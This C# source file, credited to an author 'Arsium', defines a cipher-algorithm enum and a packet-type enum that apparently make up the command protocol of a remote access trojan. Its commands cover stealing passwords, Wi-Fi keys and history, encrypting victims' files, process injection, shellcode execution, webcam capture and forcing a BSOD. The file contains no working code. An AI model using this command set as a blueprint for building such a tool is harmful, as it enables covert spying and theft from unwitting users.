
/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Shared
{
    public enum Algorithm : int
    {
        Blowfish,
        Cast5,
        Cast6,
        DesEde,
        DesEngine,
        Dstu7624,
        Gost28147,
        Idea,
        Noekeon,
        RC2,
        RC532,
        RC6,
        Rijndael,
        Seed,
        Serpent,
        Skipjack,
        SM4,
        Tea,
        Threefish,
        Tnepres,
        Twofish,
        Xtea,
        Chacha,
        Chacha7539,
        Salsa20,
        XSalsa20,
        Vmpc,
        RC4,
        VmpcKsa3,
        HC256,
        Isaac
    }
    public enum PacketType : int
    {
        ID,
        PLUGIN,
        CLOSE,
        UNINSTALL_TASKSCH,
        PASSWORDS,
        WIFI,
        HISTORY,

        GET_FM,
        GET_D,
        GET_F,
        DOWNLOAD_F,
        DELETE_F,
        UPLOAD_F,
        LAUNCH_F,
        RENAME_F,
        ENCRYPT_F,
        DECRYPT_F,
        ENCRYPT_D,
        DECRYPT_D,
        SHORTCUT_DESKTOP,
        SHORTCUT_DOCUMENTS,
        SHORTCUT_DOWNLOADS,

        HIDE_DI,
        SHOW_DI,
        HIDE_TB,
        SHOW_TB,

        REBOOT_SYS,
        POWER_OFF_SYS,
        LOG_OUT_SYS,
        SUSPEND_SYS,
        HIBERNATE_SYS,
        BSOD_SYS,

        SCRL_ON,
        SRCL_OFF,
        KB_ON,
        KB_OFF,
        MS_ON,
        MS_OFF,
        GET_PRIV,

        GET_PROC,
        SUSPEND_PROC,
        RESUME_PROC,
        KILL_PROC,
        INJECT_CLASSIC_METHOD,
        INJECT_MAP_VIEW_SECTION,
        SET_WND_TEXT,
        MINIMZE_WND,
        MAXIMIZE_WND,
        HIDE_WND,
        SHOW_WND,

        EXEC_MANAGED_DLL,
        EXEC_NATIVE_DLL,
        EXEC_SHELL_CODE,
        EXEC_NATIVE_EXE,

        REMOTE_VIEW,
        STOP_REMOTE_VIEW,
        MOUSE_DOWN,
        MOUSE_UP,
        MOUSE_MOVE,

        SET_DESK_WP,

        GET_CAMERAS,
        CAPTURE_CAMERA,
        STOP_CAPTURE_CAMERA,

        MUTE_AUDIO,
        AUDIO_UP,
        AUDIO_DOWN,

        GET_INFORMATION
    }
}
